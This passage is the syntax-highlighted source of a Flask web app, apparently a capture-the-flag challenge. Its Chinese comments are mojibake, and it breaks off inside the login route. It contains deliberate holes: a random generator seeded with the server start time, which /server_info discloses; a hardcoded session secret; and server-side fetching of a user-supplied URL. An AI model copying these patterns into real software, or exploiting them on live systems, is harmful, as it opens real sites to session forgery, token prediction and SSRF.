</span><span class="lnt">136
</span><span class="lnt">137
</span><span class="lnt">138
</span><span class="lnt">139
</span><span class="lnt">140
</span><span class="lnt">141
</span><span class="lnt">142
</span><span class="lnt">143
</span><span class="lnt">144
</span><span class="lnt">145
</span><span class="lnt">146
</span><span class="lnt">147
</span><span class="lnt">148
</span><span class="lnt">149
</span><span class="lnt">150
</span><span class="lnt">151
</span><span class="lnt">152
</span><span class="lnt">153
</span><span class="lnt">154
</span><span class="lnt">155
</span><span class="lnt">156
</span><span class="lnt">157
</span><span class="lnt">158
</span><span class="lnt">159
</span><span class="lnt">160
</span><span class="lnt">161
</span><span class="lnt">162
</span><span class="lnt">163
</span><span class="lnt">164
</span><span class="lnt">165
</span><span class="lnt">166
</span><span class="lnt">167
</span><span class="lnt">168
</span><span class="lnt">169
</span><span class="lnt">170
</span><span class="lnt">171
</span><span class="lnt">172
</span><span class="lnt">173
</span><span class="lnt">174
</span><span class="lnt">175
</span><span class="lnt">176
</span><span class="lnt">177
</span><span class="lnt">178
</span><span class="lnt">179
</span><span class="lnt">180
</span><span class="lnt">181
</span><span class="lnt">182
</span><span class="lnt">183
</span><span class="lnt">184
</span><span class="lnt">185
</span><span class="lnt">186
</span><span class="lnt">187
</span><span class="lnt">188
</span><span class="lnt">189
</span><span class="lnt">190
</span><span class="lnt">191
</span><span class="lnt">192
</span><span class="lnt">193
</span><span class="lnt">194
</span><span class="lnt">195
</span><span class="lnt">196
</span><span class="lnt">197
</span><span class="lnt">198
</span><span class="lnt">199
</span><span class="lnt">200
</span><span class="lnt">201
</span><span class="lnt">202
</span><span class="lnt">203
</span><span class="lnt">204
</span><span class="lnt">205
</span><span class="lnt">206
</span><span class="lnt">207
</span><span class="lnt">208
</span><span class="lnt">209
</span><span class="lnt">210
</span><span class="lnt">211
</span><span class="lnt">212
</span><span class="lnt">213
</span><span class="lnt">214
</span><span class="lnt">215
</span><span class="lnt">216
</span><span class="lnt">217
</span><span class="lnt">218
</span><span class="lnt">219
</span><span class="lnt">220
</span><span class="lnt">221
</span><span class="lnt">222
</span><span class="lnt">223
</span><span class="lnt">224
</span><span class="lnt">225
</span><span class="lnt">226
</span><span class="lnt">227
</span><span class="lnt">228
</span><span class="lnt">229
</span><span class="lnt">230
</span><span class="lnt">231
</span><span class="lnt">232
</span><span class="lnt">233
</span><span class="lnt">234
</span><span class="lnt">235
</span><span class="lnt">236
</span><span class="lnt">237
</span><span class="lnt">238
</span><span class="lnt">239
</span><span class="lnt">240
</span><span class="lnt">241
</span><span class="lnt">242
</span><span class="lnt">243
</span><span class="lnt">244
</span><span class="lnt">245
</span><span class="lnt">246
</span><span class="lnt">247
</span><span class="lnt">248
</span><span class="lnt">249
</span><span class="lnt">250
</span><span class="lnt">251
</span><span class="lnt">252
</span><span class="lnt">253
</span><span class="lnt">254
</span><span class="lnt">255
</span><span class="lnt">256
</span><span class="lnt">257
</span><span class="lnt">258
</span><span class="lnt">259
</span><span class="lnt">260
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="c1"># -*- encoding: utf-8 -*-</span>
</span></span><span class="line"><span class="cl"><span class="s1">&#39;&#39;&#39;
</span></span></span><span class="line"><span class="cl"><span class="s1">@File    :   app.py
</span></span></span><span class="line"><span class="cl"><span class="s1">@Time    :   2066/07/05 19:20:29
</span></span></span><span class="line"><span class="cl"><span class="s1">@Author  :   Ekko exec inc. æŸç‰›é©¬ç¨‹åºå‘˜ 
</span></span></span><span class="line"><span class="cl"><span class="s1">&#39;&#39;&#39;</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">os</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">time</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">uuid</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">functools</span> <span class="kn">import</span> <span class="n">wraps</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">datetime</span> <span class="kn">import</span> <span class="n">datetime</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">secrets</span> <span class="kn">import</span> <span class="n">token_urlsafe</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">flask_sqlalchemy</span> <span class="kn">import</span> <span class="n">SQLAlchemy</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">werkzeug.security</span> <span class="kn">import</span> <span class="n">generate_password_hash</span><span class="p">,</span> <span class="n">check_password_hash</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">flask</span> <span class="kn">import</span> <span class="n">Flask</span><span class="p">,</span> <span class="n">render_template</span><span class="p">,</span> <span class="n">redirect</span><span class="p">,</span> <span class="n">url_for</span><span class="p">,</span> <span class="n">request</span><span class="p">,</span> <span class="n">flash</span><span class="p">,</span> <span class="n">session</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">SERVER_START_TIME</span> <span class="o">=</span> <span class="n">time</span><span class="o">.</span><span class="n">time</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># æ¬¸æˆ‘è‰¹è¿™ä¸¤è¡Œä»£ç æµ‹è¯•ç”¨çš„å¿˜è®°åˆ äº†ï¼Œæ¬¸ç®—äº†éƒ½å‘å¸ƒäº†ï¼Œæˆ‘ä»¬éƒ½åœ¨ç”¨åŠ›åœ°æ´»ç€ï¼Œè·Ÿæˆ‘çš„ä¸‹ç­è¯´å»å§ã€‚</span>
</span></span><span class="line"><span class="cl"><span class="c1"># åæ­£æ•´ä¸ªç¨‹åºæ²¡æœ‰ä¸€ä¸ªåœ°æ–¹ç”¨åˆ°randomåº“ã€‚åº”è¯¥æ²¡æœ‰ä»€ä¹ˆé—®é¢˜ã€‚</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">random</span>
</span></span><span class="line"><span class="cl"><span class="n">random</span><span class="o">.</span><span class="n">seed</span><span class="p">(</span><span class="n">SERVER_START_TIME</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">admin_super_strong_password</span> <span class="o">=</span> <span class="n">token_urlsafe</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="n">app</span> <span class="o">=</span> <span class="n">Flask</span><span class="p">(</span><span class="vm">__name__</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">app</span><span class="o">.</span><span class="n">config</span><span class="p">[</span><span class="s1">&#39;SECRET_KEY&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="s1">&#39;your-secret-key-here&#39;</span>
</span></span><span class="line"><span class="cl"><span class="n">app</span><span class="o">.</span><span class="n">config</span><span class="p">[</span><span class="s1">&#39;SQLALCHEMY_DATABASE_URI&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="s1">&#39;sqlite:///site.db&#39;</span>
</span></span><span class="line"><span class="cl"><span class="n">app</span><span class="o">.</span><span class="n">config</span><span class="p">[</span><span class="s1">&#39;SQLALCHEMY_TRACK_MODIFICATIONS&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="kc">False</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">db</span> <span class="o">=</span> <span class="n">SQLAlchemy</span><span class="p">(</span><span class="n">app</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">User</span><span class="p">(</span><span class="n">db</span><span class="o">.</span><span class="n">Model</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="nb">id</span> <span class="o">=</span> <span class="n">db</span><span class="o">.</span><span class="n">Column</span><span class="p">(</span><span class="n">db</span><span class="o">.</span><span class="n">Integer</span><span class="p">,</span> <span class="n">primary_key</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">username</span> <span class="o">=</span> <span class="n">db</span><span class="o">.</span><span class="n">Column</span><span class="p">(</span><span class="n">db</span><span class="o">.</span><span class="n">String</span><span class="p">(</span><span class="mi">20</span><span class="p">),</span> <span class="n">unique</span><span class="o">=</span><span class="kc">True</span><span class="p">,</span> <span class="n">nullable</span><span class="o">=</span><span class="kc">False</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">email</span> <span class="o">=</span> <span class="n">db</span><span class="o">.</span><span class="n">Column</span><span class="p">(</span><span class="n">db</span><span class="o">.</span><span class="n">String</span><span class="p">(</span><span class="mi">120</span><span class="p">),</span> <span class="n">unique</span><span class="o">=</span><span class="kc">True</span><span class="p">,</span> <span class="n">nullable</span><span class="o">=</span><span class="kc">False</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">password</span> <span class="o">=</span> <span class="n">db</span><span class="o">.</span><span class="n">Column</span><span class="p">(</span><span class="n">db</span><span class="o">.</span><span class="n">String</span><span class="p">(</span><span class="mi">60</span><span class="p">),</span> <span class="n">nullable</span><span class="o">=</span><span class="kc">False</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">is_admin</span> <span class="o">=</span> <span class="n">db</span><span class="o">.</span><span class="n">Column</span><span class="p">(</span><span class="n">db</span><span class="o">.</span><span class="n">Boolean</span><span class="p">,</span> <span class="n">default</span><span class="o">=</span><span class="kc">False</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">time_api</span> <span class="o">=</span> <span class="n">db</span><span class="o">.</span><span class="n">Column</span><span class="p">(</span><span class="n">db</span><span class="o">.</span><span class="n">String</span><span class="p">(</span><span class="mi">200</span><span class="p">),</span> <span class="n">default</span><span class="o">=</span><span class="s1">&#39;https://api.uuni.cn//api/time&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">PasswordResetToken</span><span class="p">(</span><span class="n">db</span><span class="o">.</span><span class="n">Model</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="nb">id</span> <span class="o">=</span> <span class="n">db</span><span class="o">.</span><span class="n">Column</span><span class="p">(</span><span class="n">db</span><span class="o">.</span><span class="n">Integer</span><span class="p">,</span> <span class="n">primary_key</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">user_id</span> <span class="o">=</span> <span class="n">db</span><span class="o">.</span><span class="n">Column</span><span class="p">(</span><span class="n">db</span><span class="o">.</span><span class="n">Integer</span><span class="p">,</span> <span class="n">db</span><span class="o">.</span><span class="n">ForeignKey</span><span class="p">(</span><span class="s1">&#39;user.id&#39;</span><span class="p">),</span> <span class="n">nullable</span><span class="o">=</span><span class="kc">False</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">token</span> <span class="o">=</span> <span class="n">db</span><span class="o">.</span><span class="n">Column</span><span class="p">(</span><span class="n">db</span><span class="o">.</span><span class="n">String</span><span class="p">(</span><span class="mi">36</span><span class="p">),</span> <span class="n">unique</span><span class="o">=</span><span class="kc">True</span><span class="p">,</span> <span class="n">nullable</span><span class="o">=</span><span class="kc">False</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">used</span> <span class="o">=</span> <span class="n">db</span><span class="o">.</span><span class="n">Column</span><span class="p">(</span><span class="n">db</span><span class="o">.</span><span class="n">Boolean</span><span class="p">,</span> <span class="n">default</span><span class="o">=</span><span class="kc">False</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">padding</span><span class="p">(</span><span class="n">input_string</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">byte_string</span> <span class="o">=</span> <span class="n">input_string</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s1">&#39;utf-8&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">byte_string</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">6</span><span class="p">:</span> <span class="n">byte_string</span> <span class="o">=</span> <span class="n">byte_string</span><span class="p">[:</span><span class="mi">6</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">    <span class="n">padded_byte_string</span> <span class="o">=</span> <span class="n">byte_string</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">6</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">padded_int</span> <span class="o">=</span> <span class="nb">int</span><span class="o">.</span><span class="n">from_bytes</span><span class="p">(</span><span class="n">padded_byte_string</span><span class="p">,</span> <span class="n">byteorder</span><span class="o">=</span><span class="s1">&#39;big&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">padded_int</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">with</span> <span class="n">app</span><span class="o">.</span><span class="n">app_context</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="n">db</span><span class="o">.</span><span class="n">create_all</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="ow">not</span> <span class="n">User</span><span class="o">.</span><span class="n">query</span><span class="o">.</span><span class="n">filter_by</span><span class="p">(</span><span class="n">username</span><span class="o">=</span><span class="s1">&#39;admin&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">first</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">        <span class="n">admin</span> <span class="o">=</span> <span class="n">User</span><span class="p">(</span>
</span></span><span class="line"><span class="cl">            <span class="n">username</span><span class="o">=</span><span class="s1">&#39;admin&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="n">email</span><span class="o">=</span><span class="s1">&#39;admin@example.com&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="n">password</span><span class="o">=</span><span class="n">generate_password_hash</span><span class="p">(</span><span class="n">admin_super_strong_password</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">            <span class="n">is_admin</span><span class="o">=</span><span class="kc">True</span>
</span></span><span class="line"><span class="cl">        <span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">db</span><span class="o">.</span><span class="n">session</span><span class="o">.</span><span class="n">add</span><span class="p">(</span><span class="n">admin</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">db</span><span class="o">.</span><span class="n">session</span><span class="o">.</span><span class="n">commit</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">login_required</span><span class="p">(</span><span class="n">f</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="nd">@wraps</span><span class="p">(</span><span class="n">f</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">def</span> <span class="nf">decorated_function</span><span class="p">(</span><span class="o">*</span><span class="n">args</span><span class="p">,</span> <span class="o">**</span><span class="n">kwargs</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="s1">&#39;user_id&#39;</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">session</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">flash</span><span class="p">(</span><span class="s1">&#39;è¯·ç™»å½•&#39;</span><span class="p">,</span> <span class="s1">&#39;danger&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="n">redirect</span><span class="p">(</span><span class="n">url_for</span><span class="p">(</span><span class="s1">&#39;login&#39;</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">f</span><span class="p">(</span><span class="o">*</span><span class="n">args</span><span class="p">,</span> <span class="o">**</span><span class="n">kwargs</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">decorated_function</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">admin_required</span><span class="p">(</span><span class="n">f</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="nd">@wraps</span><span class="p">(</span><span class="n">f</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">def</span> <span class="nf">decorated_function</span><span class="p">(</span><span class="o">*</span><span class="n">args</span><span class="p">,</span> <span class="o">**</span><span class="n">kwargs</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="s1">&#39;user_id&#39;</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">session</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">flash</span><span class="p">(</span><span class="s1">&#39;è¯·ç™»å½•&#39;</span><span class="p">,</span> <span class="s1">&#39;danger&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="n">redirect</span><span class="p">(</span><span class="n">url_for</span><span class="p">(</span><span class="s1">&#39;login&#39;</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">        <span class="n">user</span> <span class="o">=</span> <span class="n">User</span><span class="o">.</span><span class="n">query</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">session</span><span class="p">[</span><span class="s1">&#39;user_id&#39;</span><span class="p">])</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="ow">not</span> <span class="n">user</span><span class="o">.</span><span class="n">is_admin</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">flash</span><span class="p">(</span><span class="s1">&#39;ä½ ä¸æ˜¯admin&#39;</span><span class="p">,</span> <span class="s1">&#39;danger&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="n">redirect</span><span class="p">(</span><span class="n">url_for</span><span class="p">(</span><span class="s1">&#39;home&#39;</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">f</span><span class="p">(</span><span class="o">*</span><span class="n">args</span><span class="p">,</span> <span class="o">**</span><span class="n">kwargs</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">decorated_function</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">check_time_api</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="n">user</span> <span class="o">=</span> <span class="n">User</span><span class="o">.</span><span class="n">query</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">session</span><span class="p">[</span><span class="s1">&#39;user_id&#39;</span><span class="p">])</span>
</span></span><span class="line"><span class="cl">    <span class="k">try</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">user</span><span class="o">.</span><span class="n">time_api</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">data</span> <span class="o">=</span> <span class="n">response</span><span class="o">.</span><span class="n">json</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">        <span class="n">datetime_str</span> <span class="o">=</span> <span class="n">data</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;date&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">datetime_str</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="nb">print</span><span class="p">(</span><span class="n">datetime_str</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="n">current_time</span> <span class="o">=</span> <span class="n">datetime</span><span class="o">.</span><span class="n">fromisoformat</span><span class="p">(</span><span class="n">datetime_str</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="n">current_time</span><span class="o">.</span><span class="n">year</span> <span class="o">&gt;=</span> <span class="mi">2066</span>
</span></span><span class="line"><span class="cl">    <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="kc">None</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="kc">None</span>
</span></span><span class="line"><span class="cl"><span class="nd">@app.route</span><span class="p">(</span><span class="s1">&#39;/&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">home</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s1">&#39;home.html&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nd">@app.route</span><span class="p">(</span><span class="s1">&#39;/server_info&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nd">@login_required</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">server_info</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="s1">&#39;server_start_time&#39;</span><span class="p">:</span> <span class="n">SERVER_START_TIME</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="s1">&#39;current_time&#39;</span><span class="p">:</span> <span class="n">time</span><span class="o">.</span><span class="n">time</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="nd">@app.route</span><span class="p">(</span><span class="s1">&#39;/register&#39;</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;GET&#39;</span><span class="p">,</span> <span class="s1">&#39;POST&#39;</span><span class="p">])</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">register</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">request</span><span class="o">.</span><span class="n">method</span> <span class="o">==</span> <span class="s1">&#39;POST&#39;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">username</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">form</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;username&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">email</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">form</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;email&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">password</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">form</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;password&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">confirm_password</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">form</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;confirm_password&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">password</span> <span class="o">!=</span> <span class="n">confirm_password</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">flash</span><span class="p">(</span><span class="s1">&#39;å¯†ç é”™è¯¯&#39;</span><span class="p">,</span> <span class="s1">&#39;danger&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="n">redirect</span><span class="p">(</span><span class="n">url_for</span><span class="p">(</span><span class="s1">&#39;register&#39;</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="n">existing_user</span> <span class="o">=</span> <span class="n">User</span><span class="o">.</span><span class="n">query</span><span class="o">.</span><span class="n">filter_by</span><span class="p">(</span><span class="n">username</span><span class="o">=</span><span class="n">username</span><span class="p">)</span><span class="o">.</span><span class="n">first</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">existing_user</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">flash</span><span class="p">(</span><span class="s1">&#39;å·²ç»å­˜åœ¨è¿™ä¸ªç”¨æˆ·äº†&#39;</span><span class="p">,</span> <span class="s1">&#39;danger&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="n">redirect</span><span class="p">(</span><span class="n">url_for</span><span class="p">(</span><span class="s1">&#39;register&#39;</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="n">existing_email</span> <span class="o">=</span> <span class="n">User</span><span class="o">.</span><span class="n">query</span><span class="o">.</span><span class="n">filter_by</span><span class="p">(</span><span class="n">email</span><span class="o">=</span><span class="n">email</span><span class="p">)</span><span class="o">.</span><span class="n">first</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">existing_email</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">flash</span><span class="p">(</span><span class="s1">&#39;è¿™ä¸ªé‚®ç®±å·²ç»è¢«æ³¨å†Œäº†&#39;</span><span class="p">,</span> <span class="s1">&#39;danger&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="n">redirect</span><span class="p">(</span><span class="n">url_for</span><span class="p">(</span><span class="s1">&#39;register&#39;</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="n">hashed_password</span> <span class="o">=</span> <span class="n">generate_password_hash</span><span class="p">(</span><span class="n">password</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">new_user</span> <span class="o">=</span> <span class="n">User</span><span class="p">(</span><span class="n">username</span><span class="o">=</span><span class="n">username</span><span class="p">,</span> <span class="n">email</span><span class="o">=</span><span class="n">email</span><span class="p">,</span> <span class="n">password</span><span class="o">=</span><span class="n">hashed_password</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">db</span><span class="o">.</span><span class="n">session</span><span class="o">.</span><span class="n">add</span><span class="p">(</span><span class="n">new_user</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">db</span><span class="o">.</span><span class="n">session</span><span class="o">.</span><span class="n">commit</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="n">flash</span><span class="p">(</span><span class="s1">&#39;æ³¨å†ŒæˆåŠŸï¼Œè¯·ç™»å½•&#39;</span><span class="p">,</span> <span class="s1">&#39;success&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">redirect</span><span class="p">(</span><span class="n">url_for</span><span class="p">(</span><span class="s1">&#39;login&#39;</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s1">&#39;register.html&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nd">@app.route</span><span class="p">(</span><span class="s1">&#39;/login&#39;</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;GET&#39;</span><span class="p">,</span> <span class="s1">&#39;POST&#39;</span><span class="p">])</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">login</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">request</span><span class="o">.</span><span class="n">method</span> <span class="o">==</span> <span class="s1">&#39;POST&#39;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">username</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">form</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;username&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">password</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">form</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;password&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="n">user</span> <span class="o">=</span> <span class="n">User</span><span class="o">.</span><span class="n">query</span><span class="o">.</span><span class="n">filter_by</span><span class="p">(</span><span class="n">username</span><span class="o">=</span><span class="n">username</span><span class="p">)</span><span class="o">.</span><span class="n">first</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">user</span> <span class="ow">and</span> <span class="n">check_password_hash</span><span class="p">(</span><span class="n">user</span><span class="o">.</span><span class="n">password</span><span class="p">,</span> <span class="n">password</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">            <span class="n">session</span><span class="p">[</span><span class="s1">&#39;user_id&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="n">user</span><span class="o">.</span><span class="n">id</span>
</span></span><span class="line"><span class="cl">            <span class="n">session</span><span class="p">[</span><span class="s1">&#39;username&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="n">user</span><span class="o">.</span><span class="n">username</span>
</span></span><span class="line"><span class="cl">            <span class="n">session</span><span class="p">[</span><span class="s1">&#39;is_admin&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="n">user</span><span class="o">.</span><span class="n">is_admin</span>
